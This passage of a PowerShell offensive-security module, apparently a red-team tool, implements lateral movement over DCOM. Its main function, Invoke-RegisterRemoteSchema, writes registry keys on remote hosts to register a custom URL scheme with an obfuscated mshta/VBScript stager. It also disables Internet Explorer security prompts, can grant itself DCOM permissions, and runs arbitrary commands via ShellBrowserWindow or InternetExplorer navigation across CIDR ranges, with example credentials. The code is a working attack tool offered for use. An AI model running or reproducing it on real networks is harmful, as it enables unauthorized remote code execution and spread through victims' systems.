                if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
                    continue
                }
                $ObjectName = Wrap-CLSID -ObjectName $ObjectName
                if(!$SkipRegAuth) {  # If SkipRegAuth is not specified
                    if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM -CheckWritePermissions:$AutoGrant)) {
                        Write-Log -Level ERROR -Message "Can't interact with HKLM! Please try to use -SkipRegAuth flag"
                        continue
                    }

                    if(!$SkipPermissionChecks) { # If SkipPermissionChecks is not specified
                        if(!(Test-DCOMStatus -AutoGrant:$AutoGrant)) {
                            continue
                        }
                        $global:usergroups = Get-UserGroup -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]
                        $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant
                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
                        if(!$CLSIDChecks) {
                            Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
                            continue
                        }
                    }
                }

                
                if(!(Start-COMObjectInstance -ObjectName $ObjectName -RemoteIP $RemoteIP)) {
                    continue
                }

                $ExecutedCommands = 0
                foreach($Command in $Commands) {
                    $SplittedPath = $Command['ObjectPath'].Split(".")
                    $CurrentObjectPath = (Skip-LastItem -Array $SplittedPath) -join "."
                    $path = ""
                    foreach($PropertyName in (Skip-LastItem -Array $SplittedPath)) {
                        if(!(Browse-COMProperty -ObjectPath $path -PropertyName $PropertyName)) {
                            Write-Log -Level ERROR -Message "Can't access ${$path} path!"
                            continue
                        }
                        $path = Iif -Condition $path -Right "$($path).$($PropertyName)" -Wrong $PropertyName
                    }
                    if(Set-COMProperty -ObjectPath $CurrentObjectPath -PropertyName $SplittedPath[-1] -ArgumentList $Command['Arguments']) {
                        $ExecutedCommands += 1
                    }
                }
                Write-Log -Level INFO -Message "$($ExecutedCommands) of $($Commands.Count) commands executed successfully!"
                continue

        
            } catch {
                Write-Log -Level ERROR -Message $_
            } finally {
                Start-DefaultTasks -Type EndTask -AutoGrant:$AutoGrant|Out-Null
            }
        }
    } catch {
        Write-Log -Level ERROR -Message $_
    } finally {
        Start-DefaultTasks -Type Finish|Out-Null
    }
}

function Invoke-RegisterRemoteSchema {
    <#
        .SYNOPSIS
        D(COM) V(ulnerability) S(canner) AKA Devious swiss army knife - Lateral movement using DCOM Objects

        .DESCRIPTION
        Invoke-RegisterRemoteSchema function executes commands via InternetExplorer.Application's object using the logged-on user or provided credentials.
        Note: This object doesn't need any access to local machine hive, it will proceed with the foothold with any user that can access the remote machine!

        .PARAMETER HostList
        Specifies IPAddresses, CIDR ranges or hostnames to interact with (Default: 127.0.0.1).
        You can also specify CIDR, and set bulk of ranges using comma
        Example: 10.211.55.1/24
        Example 2: 10.211.55.1/24, 10.211.56.1, 10.211.57.1/24, anyhostname

        .PARAMETER Username
        Specifies the username to use for access.
        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session

        .PARAMETER Password
        Specifies the password to use for access.
        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session

        .PARAMETER AutoGrant
        AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
        (This is required when don't have the rights to interact with the DCOM object).
        Windows wil allow by default the following ACTIVE SESSIONS:
            Administrators
            System

        .PARAMETER SkipPermissionChecks
        Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions).
        This flag is created to solve the edge-case in which the tool have read access to the HKLM Hive, but can't resolve the groups the current logged-on/provided user is a member of.


        .PARAMETER URLScheme
        Specifies the URL scheme in order to trigger the execution (Default: dvs)

        .PARAMETER StageCommand
        Specifies the Stage command in order to execute the payload (must include %1 in order to use your payload)

        .PARAMETER Command
        Specifies the command to execute.

        .PARAMETER NoBracketsDoubleEncoding
        By triggering this flag, the tool will not perform double URL encoding on brackets

        .PARAMETER Verbose
        Get Verbose logging

        .EXAMPLE

        Executes "cmd /c calc" command on 10.211.55.1/24 remote machine using the current logged-on session, and grant privileges if is needed
        
        PS> Invoke-RegisterRemoteSchema -HostList "10.211.55.1/24" -Command "cmd /c calc" -AutoGrant -Verbose

        .EXAMPLE

        Executes "cmd /c calc" command on 10.211.55.4 remote machine using provided credentials
        
        PS> Invoke-RegisterRemoteSchema -HostList "10.211.55.4" -Command "cmd /c calc" -Username "Administrator" -Password "Aa123456!" -Verbose
    #>
    [CmdletBinding(SupportsShouldProcess=$true)]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$Command,
        [string]$HostList='127.0.0.1',
        [string]$Username="",
        [string]$Password="",
        [string]$URLScheme="dvs",
        [string]$StageCommand='mshta vbscript:ExEcUtE("c=Replace(Replace(Replace(""%1"", Chr(37)&""22"", Chr(34)),Chr(37)&""27"", Chr(39)),""' + $URLScheme + '://"",""""):if Right(c,1)=""/"" then:c=mid(c,1,len(c)-1):end if:sc = split(c, "" ""):f=sc(0):a=Replace(c,f,""""):CreateObject(""Shel""&""l.App""&""lication"").Shel"&"lEx"&"ecu"&"te f,"&"a,"""","""",0 :cl"&"ose")',
        [switch]$AutoGrant,
        [switch]$SkipPermissionChecks,
        [switch]$NoBracketsDoubleEncoding
    )
    try {
        Start-DefaultTasks -Type Init|Out-Null
        $URLScheme = $URLScheme.ToLower()
        if((!($URLScheme -match [regex]"^([a-z0-9]){0,}$"))) {
            Write-Log -Level ERROR -Message "URLScheme invalid! the URLscheme can contains digits and letters only!"
            return
        }
        if(!$StageCommand.Contains("%1")) {
            Write-Log -Level ERROR -Message "StageCommand must contains ""%1"" in order to execute your payload!"
            return
        }
        
        $Username = Check-Username -Username $Username

        if(!$NoBracketsDoubleEncoding) {
            $Command = $Command.Replace('"', "%2522").Replace("'", "%2527")
        }

        $DCOMWithNavigationFunctionality = @(
            "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}", # ShellBrowserWindow
            "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", # ShellWindows
            "InternetExplorer.Application",
            "{D5E8041D-920F-45e9-B8FB-B1DEB82C6E5E}" # ielowutil.exe
        )

        $IEFirstRun = @{
            ExploitationFunction="Write-RegDWORD"; Rev2SelfFunction="Remove-RegString";
            Arguments=@{Key="Software\Microsoft\Internet Explorer\Main"; Value="DisableFirstRunCustomize"};
            ExploitationAdditionalArguments=@{DWORD=0};
            ExploitationMessage="Disable the first run page in Internet Explorer";
            Rev2SelfMessage="Enable the first run page in Internet Explorer"
        }

        $AddRemoveSchemaProcess = @(
            @{
                ExploitationFunction="Add-RegSubkey"; Rev2SelfFunction="Remove-RegSubkey";
                Arguments=@{KeyLocation="SOFTWARE\Classes"; Key=$URLScheme};
                ExploitationMessage="Creates $($URLScheme) scheme";
                Rev2SelfMessage="Removes $($URLScheme) scheme"
            },
            @{
                ExploitationFunction="Write-RegString"; Rev2SelfFunction="Remove-RegString";
                Arguments=@{Key="SOFTWARE\Classes\$($URLScheme)"; Value="URL Protocol"};
                ExploitationAdditionalArguments=@{String=""};
                ExploitationMessage="Add $($URLScheme) scheme as a URL protocol";
                Rev2SelfMessage="Removes URL protocol item from the $($URLScheme) scheme"

            },
            @{
                ExploitationFunction="Write-RegString"; Rev2SelfFunction="Remove-RegString";
                Arguments=@{Key="SOFTWARE\Classes\$($URLScheme)"; Value="AppUserModelID"};
                ExploitationAdditionalArguments=@{String="Microsoft.InternetExplorer.Default"};
                ExploitationMessage="Add $($URLScheme) scheme as a default InternetExplorer scheme";
                Rev2SelfMessage="Removes $($URLScheme) scheme from the default InternetExplorer scheme list"
            },
            @{
                ExploitationFunction="Add-RegSubkey"; Rev2SelfFunction="Remove-RegSubkey";
                Arguments=@{KeyLocation="SOFTWARE\Classes\$($URLScheme)"; Key="shell"};
                ExploitationMessage="Creates $($URLScheme)\shell key";
                Rev2SelfMessage="Removes $($URLScheme)\shell key"
            },

            @{
                ExploitationFunction="Add-RegSubkey"; Rev2SelfFunction="Remove-RegSubkey";
                Arguments=@{KeyLocation="SOFTWARE\Classes\$($URLScheme)\shell"; Key="open"};
                ExploitationMessage="Creates $($URLScheme)\shell\open key";
                Rev2SelfMessage="Removes $($URLScheme)\shell\open key"
            },
            @{
                ExploitationFunction="Write-RegString"; Rev2SelfFunction="Remove-RegString";
                Arguments=@{Key="SOFTWARE\Classes\$($URLScheme)\shell\open"; Value="CommandId"};
                ExploitationAdditionalArguments=@{String="IE.Protocol"};
                ExploitationMessage="Add $($URLScheme) scheme as a URL protocol";
                Rev2SelfMessage="Removes $($URLScheme) scheme from the URL protocol list"
            },
            @{
                ExploitationFunction="Add-RegSubkey"; Rev2SelfFunction="Remove-RegSubkey";
                Arguments=@{KeyLocation="SOFTWARE\Classes\$($URLScheme)\shell\open"; Key="command"};
                ExploitationMessage="Creates $($URLScheme)\shell\open\command key";
                Rev2SelfMessage="Removes $($URLScheme)\shell\open\command key";
            },
            @{
                ExploitationFunction="Write-RegString"; Rev2SelfFunction="Remove-RegString";
                Arguments=@{Key="SOFTWARE\Classes\$($URLScheme)\shell\open\command"; Value=""};
                ExploitationAdditionalArguments=@{String=$StageCommand};
                ExploitationMessage="Assigns stager command";
                Rev2SelfMessage="Remove stager command"
            },
            @{
                ExploitationFunction="Add-RegSubkey"; # don't make removal option for this operation
                Arguments=@{KeyLocation="SOFTWARE\Microsoft\Internet Explorer"; Key="ProtocolExecute"};
                ExploitationMessage="Creates allowed protocol list"
            },
            @{
                ExploitationFunction="Add-RegSubkey"; Rev2SelfFunction="Remove-RegSubkey";
                Arguments=@{KeyLocation="SOFTWARE\Microsoft\Internet Explorer\ProtocolExecute"; Key=$URLScheme};
                ExploitationMessage="Add $($URLScheme) scheme as allowed IE protocol";
                Rev2SelfMessage="Removes $($URLScheme) scheme as allowed IE protocol"
            },
            @{
                ExploitationFunction="Write-RegDWORD"; Rev2SelfFunction="Remove-RegString";
                Arguments=@{Key="SOFTWARE\Microsoft\Internet Explorer\ProtocolExecute\$($URLScheme)"; Value="WarnOnOpen"};
                ExploitationAdditionalArguments=@{DWORD=0};
                ExploitationMessage="Disable Warn on open mode for $($URLScheme) scheme"
                Rev2SelfMessage="Removes Warn on open mode from $($URLScheme) scheme"
            },
            @{
                ExploitationFunction="Add-RegSubkey"; # don't make removal option for this operation
                Arguments=@{KeyLocation="SOFTWARE\Microsoft\Windows\CurrentVersion"; Key="ApplicationAssociationToasts"};
                ExploitationMessage="Creates application association toasts"
            },
            @{
                ExploitationFunction="Write-RegDWORD"; Rev2SelfFunction="Remove-RegString";
                Arguments=@{Key="SOFTWARE\Microsoft\Windows\CurrentVersion\ApplicationAssociationToasts"; Value="$($URLScheme)_$($URLScheme)"};
                ExploitationAdditionalArguments=@{DWORD=0};
                ExploitationMessage="Add $($URLScheme) scheme to the application association toasts"
                Rev2SelfMessage="Removes $($URLScheme) scheme from the application association toasts"
            }
        )

        foreach($RemoteIP in (Enum-HostList -HostList $HostList)) {
            try {
                if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
                    continue
                }

                if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM)) {
                    Write-Log -Level ERROR -Message "HKLM is not readable!"
                    $DCOMList = $DCOMWithNavigationFunctionality
                    $isHKLMWritable = $false
                } else {
                    if(!$SkipPermissionChecks) {
                        if(!(Test-DCOMStatus -AutoGrant:$AutoGrant) -and !$Force) {
                            continue
                        }
                        $global:usergroups = Get-UserGroup -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]
                    }
                    $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant
                    $DCOMList = New-Object System.Collections.ArrayList
                    foreach($dcom in $DCOMWithNavigationFunctionality) {
                        if(!(is-GUID $dcom)) {
                            $dcom = Get-CLSID -ProgID $dcom
                        }
                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $dcom -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
                        if(!$Force -and ((!$DefaultChecks -and !$CLSIDChecks) -or ($DefaultChecks -and !$CLSIDChecks))) {
                            Write-Log -Level ERROR -Message "You dont have permissions to access $($dcom) object!"
                            continue
                        }
                        $DCOMList.Add($dcom)|Out-Null
                    }
                    if(!$DCOMList) {
                        Write-Log -Level ERROR -Message "The user has not granted to launch the used DCOM objects."
                        return
                    }
                    $isHKLM = $true
                    $isHKLMWritable = Check-RegistryPermission -RemoteIP $RemoteIP -Key "Software\Classes\AppID" -CheckWritePermissions

                }

                if(!$isHKLMWritable) {
                    Write-Log -Level ERROR -Message "HKLM is not writable!" -forceVerbose
                    # if HKLM is not writable, Check if the user is an active user using browsing the available SIDs inside the HKU hive
                    # if it is available, change the hive to the current user, otherwise, return
                    if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKU)) {
                        Write-Log -Level ERROR -Message "Can't access HKU Hive!" -forceVerbose
                        continue
                    }
                    $SID = (Get-userSID -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]).Trim()
                    if($SID -and (Find-InArray -Content $SID -Array (Get-RegKeyName -Key "")) -and (Find-InArray -Content "Software" -Array (Get-RegKeyName -Key $SID))) {
                        Write-Log -Level VERBOSE -Message "$($Username) is on an active session!"
                        $isHKLM = $false
                        if(!(Test-RegistryConnection -RemoteIP $RemoteIP -CheckWritePermissions -Hive HKCU)) {
                            Write-Log -Level ERROR -Message "Can't access HKCU Hive!" -forceVerbose
                            continue
                        }
                    } else {
                        Write-Log -Level ERROR -Message "Can't perform the attack! try to find another machine that currently has an active session of the provided credentials/current logged-on user, or try to use with credentials that have local-admin rights"
                        continue
                    }
                }

                
                
                

                $ExploitationSequences = New-Object System.Collections.ArrayList
                
                if(!(Find-InArray -Content "DisableFirstRunCustomize" -Array (Get-RegValueName -Key "Software\Microsoft\Internet Explorer\Main"))) {
                    $ExploitationSequences.Add($IEFirstRun)|Out-Null
                }

                $ExploitationSequences += $AddRemoveSchemaProcess

                foreach($ExploitOperation in $ExploitationSequences) {
                    $FunctionName = $ExploitOperation['ExploitationFunction']
                    $Arguments = $ExploitOperation['Arguments']
                    if(Find-InArray -Content 'ExploitationAdditionalArguments' -Array $ExploitOperation.Keys) {
                        $Arguments += $ExploitOperation['ExploitationAdditionalArguments']
                    }
                    Write-Log -Level VERBOSE -Message $ExploitOperation['ExploitationMessage']
                    (& $FunctionName @Arguments)|Out-Null
                }
                

                $isCommandExecuted = $false
                foreach($dcom in $DCOMList) {
                    if(Start-COMObjectInstance -ObjectName $dcom -RemoteIP $RemoteIP) {
                        foreach($NavigationCommand in @("Navigate", "Navigate2")) {
                            Browse-COMProperty -PropertyName "Navigate"|Out-Null
                            if(Set-COMProperty -PropertyName "Navigate" -ArgumentList @("$($URLScheme)://$($Command)")) {
                                Write-Log -Level INFO """$($Command)"" Executed successfully!"
                                $isCommandExecuted = $true
                                break
                            }
                        }
                        
                        if(Quit-COMObject) {
                            Write-Log -Level VERBOSE -Message "$($dcom) quitted successfully" 
                        }
                    }
                    if($isCommandExecuted) {
                        break
                    }
                }

                Write-Log -Level INFO -Message "Reverting the machine to the previous state"
                [System.Array]::Reverse($ExploitationSequences)|Out-Null
                foreach($ExploitOperation in $ExploitationSequences) {
                    if(!(Find-InArray -Content 'Rev2SelfFunction' -Array $ExploitOperation.Keys)) {
                        continue
                    }
                    $FunctionName = $ExploitOperation['Rev2SelfFunction']
                    $Arguments = $ExploitOperation['Arguments']
                    Write-Log -Level VERBOSE -Message $ExploitOperation['Rev2SelfMessage']
                    (& $FunctionName @Arguments)|Out-Null
                }
        
            } catch {
                Write-Log -Level ERROR -Message $_
            } finally {
                if($AutoGrant) {
                    if(!$isHKLM) {
                        Test-RegistryConnection -RemoteIP $RemoteIP -CheckWritePermissions -Hive HKLM|Out-Null
                    }
                    Rev2Self
                }
                Start-DefaultTasks -Type EndTask|Out-Null
            }
        }

    } catch {
        Write-Log -Level ERROR -Message $_
    } finally {
        Start-DefaultTasks -Type Finish|Out-Null
    }
}

Export-ModuleMember -Function Invoke-DCOMObjectScan, Get-ExecutionCommand, Invoke-ExecutionCommand, Invoke-RegisterRemoteSchema